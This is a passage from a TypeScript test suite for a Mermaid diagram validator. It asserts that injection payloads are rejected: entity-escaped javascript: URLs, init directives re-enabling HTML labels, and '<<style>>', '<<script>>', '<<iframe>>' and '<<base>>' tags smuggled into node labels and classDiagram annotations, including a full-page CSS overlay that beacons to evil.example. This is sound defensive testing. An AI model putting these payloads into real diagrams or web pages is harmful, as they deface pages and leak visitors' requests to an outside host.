    "G2: javascript: with an entity-escaped first letter": `flowchart TD
A["&#106;avascript:alert(1)"] --> B`,
    "G3: the same, double-encoded as &amp;#106;": `flowchart TD
A["&amp;#106;avascript:alert(1)"] --> B`,
    "H1: an init directive turning htmlLabels back on": `%%{init: {"flowchart":{"htmlLabels":true}}}%%
flowchart TD
A["oi"] --> B["fim"]`,
    "H2: the same key spelled security_level": `%%{init: {"security_level":"loose"}}%%
flowchart TD
A["oi"] --> B["fim"]`,
    "H3: htmlLabels behind a \\u escape, which the directive parser JSON-decodes": `%%{init: {"flowchart":{"\\u0068tmlLabels":true}}}%%
flowchart TD
A["oi"] --> B["fim"]`,
  };

  for (const [name, source] of Object.entries(attacks)) {
    it(`rejects ${name}`, () => {
      const result = mermaid.validateMermaid(source);
      expect(result.ok).toBe(false);
      expect(result.problems.length).toBeGreaterThan(0);
    });
  }

  // The eighteen above are the contract, so they are also asserted as a set: a
  // future relaxation that lets one back through has to delete a line here, not
  // merely fail to notice.
  it("lets none of the eighteen through, as a set", () => {
    const accepted = Object.entries(attacks)
      .filter(([, source]) => mermaid.validateMermaid(source).ok)
      .map(([name]) => name);

    expect(Object.keys(attacks)).toHaveLength(18);
    expect(accepted).toEqual([]);
  });
});

// `<<style>>` walked past every one of the checks above, in `main` and in the
// first version of this branch, and it is the worst of the family: to an HTML
// parser `<<name>>` is not one construct but a literal `<` followed by a real
// `<name>` element, and `<style>` is applied by `innerHTML` even though
// `<script>` is not. So a label carrying
// `<<style>>*{position:fixed;…;background:url(//evil/beacon)}` was a full-page
// defacement plus a network beacon that validated ok:true — no attribute and no
// `=` needed, which is exactly what the old "anything with an `=` stays put"
// rule assumed would be there.
describe("validateMermaid closes the `<<name>>` hole in the annotation fold", () => {
  const label = (payload: string) => `flowchart TD\n    A["${payload}"] --> B`;

  const holes: Record<string, string> = {
    "a stylesheet that covers the page and beacons out": label(
      "<<style>>*{position:fixed;top:0;left:0;width:100vw;height:100vh;" +
        "background:url(//evil.example/beacon)}",
    ),
    "a script tag": label("<<script>>alert(1)"),
    "an iframe": label("<<iframe>>"),
    "a textarea, which swallows everything after it": label("<<textarea>>"),
    "a base tag, which repoints every relative URL": label("<<base>>"),
  };

  for (const [name, source] of Object.entries(holes)) {
    it(`rejects ${name}`, () => {
      const result = mermaid.validateMermaid(source);
      expect(result.ok).toBe(false);
      expect(result.problems.join(" ")).toMatch(/tag HTML/);
    });
  }

  // The fold only exists for the classDiagram grammar, so that is the one place
  // it can be reached — and even there it is the grammar's own shape or nothing.
  const inClassDiagram: Record<string, string> = {
    "a payload glued to the annotation":
      "classDiagram\n    class X\n    <<style>>*{position:fixed;background:url(//evil.example/b)}",
    "a payload inside a class body":
      "classDiagram\n    class X {\n        <<style>>*{color:red}\n    }",
    "a call after the annotation": "classDiagram\n    class X\n    <<script>>alert(1)",
    // `;` is a statement separator, and folding it away is what let the old
    // pattern match anywhere on a line instead of only where a statement starts.
    "an annotation smuggled in after a semicolon":
      "classDiagram\n    class X; <<style>>*{position:fixed}",
    "a tag inside the annotation itself": "classDiagram\n    class X\n    <<a<b>>",
  };

  for (const [name, source] of Object.entries(inClassDiagram)) {
    it(`rejects ${name} even in a classDiagram`, () => {
      const result = mermaid.validateMermaid(source);
      expect(result.ok).toBe(false);
      expect(result.problems.join(" ")).toMatch(/tag HTML/);
    });
  }

  const legitimate: Record<string, string> = {
    "<<interface>> in a class body": `classDiagram
    class Ferramenta {
        <<interface>>
        +String nome
        +executar(args) String
    }
    Ferramenta <|-- LeitorDeArquivo`,
    "<<abstract>>": "classDiagram\n    class Base {\n        <<abstract>>\n    }",
    "<<enumeration>>":
      "classDiagram\n    class Cor {\n        <<enumeration>>\n        VERMELHO\n    }",
    // mermaid's other spelling: the annotation on its own line, naming the class.
    "the `<<interface>> Classe` form": "classDiagram\n    class Forma\n    <<interface>> Forma",
    "a stereotype of two words": "classDiagram\n    class X {\n        <<Data Class>>\n    }",
  };

  for (const [name, source] of Object.entries(legitimate)) {
    it(`still accepts ${name}`, () => {
      const result = mermaid.validateMermaid(source);
      expect(result.problems).toEqual([]);
      expect(result.ok).toBe(true);
    });
  }

  // The same annotation outside the one grammar that has annotations is markup,
  // and mermaid does not eat it there — it goes to `innerHTML` as written.
  it("does not fold an annotation in a flowchart, where mermaid would not eat it", () => {
    const result = mermaid.validateMermaid(label("<<interface>>"));
    expect(result.ok).toBe(false);
    expect(result.problems.join(" ")).toMatch(/tag HTML/);
  });
});

// The caption is the one string in this module that is spoken to the user, and
// it was the one string never validated: "O no A[Navegador] aponta para
// B[Backend] com a seta -->" went to text-to-speech as written.
describe("the caption is never mermaid syntax read out loud", () => {
  const request = { instructions: "desenha o fluxo de uma chamada de ferramenta" };

  const syntactic: Record<string, string> = {
    "node ids and an arrow": "O no A[Navegador] aponta para B[Backend] com a seta -->.",
    "an async arrow": "O ator A manda -) para B.",
    "a directive": "Veja %%{init: {\"theme\":\"dark\"}}%% no topo.",
    "node parentheses": "O no raiz((Explainer)) abre o mapa.",
    "the diagram itself": "flowchart TD A --> B",
  };

  for (const [name, caption] of Object.entries(syntactic)) {
    it(`falls back to the spoken caption when the model writes ${name}`, async () => {
      const stub = scripted([`LEGENDA: ${caption}\nDIAGRAMA:\n${SIMPLE}`]);
      const diagram = await mermaid.generateMermaid(request, randomUUID(), stub);

      expect(diagram.caption).toMatch(/fluxograma/);
      expect(diagram.caption).not.toMatch(/[[\]{}|<>`]/);
      expect(diagram.caption).not.toMatch(/--?>|-{1,2}\)|%%/);
    });
  }

  it("keeps a caption that is an ordinary spoken sentence", async () => {
    const stub = scripted([
      `LEGENDA: O navegador chama o backend e recebe a resposta de volta.\nDIAGRAMA:\n${SIMPLE}`,
    ]);
    const diagram = await mermaid.generateMermaid(request, randomUUID(), stub);

    expect(diagram.caption).toBe(
      "O navegador chama o backend e recebe a resposta de volta.",
    );
  });
});
